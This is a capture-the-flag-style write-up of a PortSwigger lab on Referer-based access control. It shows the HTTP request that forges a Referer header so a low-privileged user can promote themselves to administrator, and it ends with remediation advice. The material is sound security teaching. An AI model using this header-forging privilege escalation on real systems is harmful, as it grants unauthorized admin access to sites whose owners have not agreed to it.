# Referer-based access control

**Category:** Access control / IDOR
**Level:** Practitioner
**Mechanism:** Authorization decided by the `Referer` header — a client-controlled value

**Lab URL:** https://portswigger.net/web-security/access-control/lab-referer-based-access-control

---

## Vulnerability

The admin action (`/admin-roles`) is protected by checking the **`Referer` header**: the
server allows the request only if it appears to come from the `/admin` page. The `Referer`
is set by the client and fully attacker-controlled, so a low-privileged user supplies the
expected value and the "protection" passes.

## Reconnaissance & Exploitation

As the admin, promoting a user hits `/admin-roles` with a `Referer` pointing at the admin
panel. Testing the endpoint as **wiener** with no `Referer` returns `401`:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Cookie: session=<wiener session>
```
```http
HTTP/2 401 Unauthorized
"Unauthorized"
```

The only thing missing is the header the server trusts. Replaying with wiener's session
cookie, my own username, and the `Referer` set to the admin page:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0af400870310e2c7819448e6008c00a2.web-security-academy.net
Cookie: session=<wiener session>
Referer: https://0af400870310e2c7819448e6008c00a2.web-security-academy.net/admin
```
```http
HTTP/2 302 Found
Location: /admin
```

The `302` (not `401`) means the upgrade went through — wiener is now administrator, lab
solved. The access decision turned entirely on a header I set myself.

## Impact

Vertical privilege escalation with no admin credentials: any authenticated user escalates
to admin by adding a forged `Referer` to the request. Because the header is trivially
spoofed (and can even be crafted in a cross-site request to hit a victim), the admin
functions are effectively unprotected.

## Remediation

- Never make authorization decisions from request headers the client controls (`Referer`,
  `Origin`, `X-Forwarded-*`, `User-Agent`). They are advisory at best and forgeable at will.
- Enforce access control from the authenticated **session/role** server-side: verify the
  session belongs to an admin before performing the action.
- `Referer` has legitimate uses (CSRF defence-in-depth, analytics) but is never an
  authentication or authorization signal.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-285 (Improper Authorization); CWE-807 (Reliance on Untrusted Inputs in a Security Decision)

## Notes

- The whole category (labs 05–08) is one lesson in different costumes: the control is
  attached to something the attacker controls or can route around — a URL
  (`X-Original-URL`), the HTTP method, a flow step, and here a request header. The fix is
  always the same: decide by *authenticated identity + action*, server-side.
- Spotting it: the request works from the admin UI but returns 401 when replayed bare. Diff
  the two requests — the only meaningful difference here is the presence of `Referer`, which
  points straight at what the server is (wrongly) trusting.
- Worse in practice than it looks: a forged `Referer` can be produced by a cross-site page,
  so this can sometimes be weaponised against a logged-in admin, not just self-escalation.